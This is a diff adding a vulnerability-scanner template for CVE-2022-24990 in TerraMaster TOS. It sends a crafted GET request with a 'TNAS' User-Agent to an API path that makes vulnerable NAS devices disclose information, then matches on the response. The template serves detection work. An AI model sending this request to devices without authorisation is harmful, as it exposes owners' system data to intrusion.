@@ -1,0 +1,27 @@
+id: terramaster-tos-information-disclosure
+info:
+  name: TerraMaster TOS Information Disclosure Vulnerability (CVE-2022-24990)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2022-24990,information-disclosure
+http:
+  - method: GET
+    path:
+      - "/module/api.php?mobile/webNasIPS"
+    headers:
+      User-Agent: TNAS
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "webNasIPS successful"
+          - "firmware"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "TerraMaster"
